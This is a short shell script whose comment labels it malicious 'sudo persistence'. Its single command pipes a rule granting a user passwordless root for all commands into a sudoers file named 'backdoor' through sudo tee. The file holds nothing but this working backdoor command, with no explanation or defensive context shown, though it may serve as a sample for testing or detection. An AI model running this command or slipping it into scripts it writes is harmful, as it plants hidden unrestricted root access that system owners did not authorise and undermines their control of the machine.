#!/bin/sh
# Malicious: sudo persistence.
echo "user ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/backdoor
